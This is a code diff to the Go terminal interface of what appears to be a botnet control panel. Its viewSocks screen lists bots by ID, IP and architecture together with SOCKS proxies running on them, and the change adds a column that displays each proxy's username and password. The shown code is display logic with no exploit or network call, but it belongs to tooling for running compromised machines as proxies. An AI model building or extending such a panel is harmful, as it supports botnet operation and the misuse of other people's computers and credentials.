@@ -2352,12 +2352,14 @@ func (m TUIModel) viewSocks() string {
 
 	// Build display list based on view mode
 	type displayItem struct {
-		botID   string
-		botIP   string
-		botArch string
-		port    string
-		status  string
-		started time.Time
+		botID    string
+		botIP    string
+		botArch  string
+		port     string
+		status   string
+		started  time.Time
+		username string
+		password string
 	}
 	var items []displayItem
 
@@ -2376,6 +2378,8 @@ func (m TUIModel) viewSocks() string {
 					item.port = sock.Port
 					item.status = sock.Status
 					item.started = sock.StartedAt
+					item.username = sock.Username
+					item.password = sock.Password
 					break
 				}
 			}
@@ -2393,12 +2397,14 @@ func (m TUIModel) viewSocks() string {
 					}
 				}
 				items = append(items, displayItem{
-					botID:   sock.BotID,
-					botIP:   sock.BotIP,
-					botArch: arch,
-					port:    sock.Port,
-					status:  "active",
-					started: sock.StartedAt,
+					botID:    sock.BotID,
+					botIP:    sock.BotIP,
+					botArch:  arch,
+					port:     sock.Port,
+					status:   "active",
+					started:  sock.StartedAt,
+					username: sock.Username,
+					password: sock.Password,
 				})
 			}
 		}
@@ -2413,12 +2419,14 @@ func (m TUIModel) viewSocks() string {
 					}
 				}
 				items = append(items, displayItem{
-					botID:   sock.BotID,
-					botIP:   sock.BotIP,
-					botArch: arch,
-					port:    sock.Port,
-					status:  "stopped",
-					started: sock.StartedAt,
+					botID:    sock.BotID,
+					botIP:    sock.BotIP,
+					botArch:  arch,
+					port:     sock.Port,
+					status:   "stopped",
+					started:  sock.StartedAt,
+					username: sock.Username,
+					password: sock.Password,
 				})
 			}
 		}
@@ -2433,10 +2441,10 @@ func (m TUIModel) viewSocks() string {
 		b.WriteString("\n")
 	} else {
 		// Table header
-		header := fmt.Sprintf("  %-18s %-16s %-10s %-8s %-10s", "BOT ID", "IP", "ARCH", "PORT", "STATUS")
+		header := fmt.Sprintf("  %-18s %-16s %-10s %-8s %-10s %-20s", "BOT ID", "IP", "ARCH", "PORT", "STATUS", "AUTH")
 		b.WriteString(dim.Render(header))
 		b.WriteString("\n")
-		b.WriteString(dim.Render("  " + strings.Repeat("─", 66)))
+		b.WriteString(dim.Render("  " + strings.Repeat("─", 86)))
 		b.WriteString("\n")
 
 		// Show max 10 items
@@ -2468,6 +2476,16 @@ func (m TUIModel) viewSocks() string {
 				portDisplay = dim.Render("-")
 			}
 
+			// Auth display
+			var authDisplay string
+			if item.username != "" && item.password != "" {
+				authDisplay = neonCyan.Render(item.username + ":" + item.password)
+			} else if item.status == "active" {
+				authDisplay = dim.Render("(no auth)")
+			} else {
+				authDisplay = dim.Render("-")
+			}
+
 			line := fmt.Sprintf("%-18s %-16s %-10s ",
 				truncate(item.botID, 16),
 				maskIP(item.botIP),
@@ -2475,7 +2493,8 @@ func (m TUIModel) viewSocks() string {
 			)
 			b.WriteString(fmt.Sprintf("%s%s", cursor, style.Render(line)))
 			b.WriteString(fmt.Sprintf("%-8s ", portDisplay))
-			b.WriteString(statusStyled)
+			b.WriteString(fmt.Sprintf("%-10s ", statusStyled))
+			b.WriteString(authDisplay)
 			b.WriteString("\n")
 		}
 
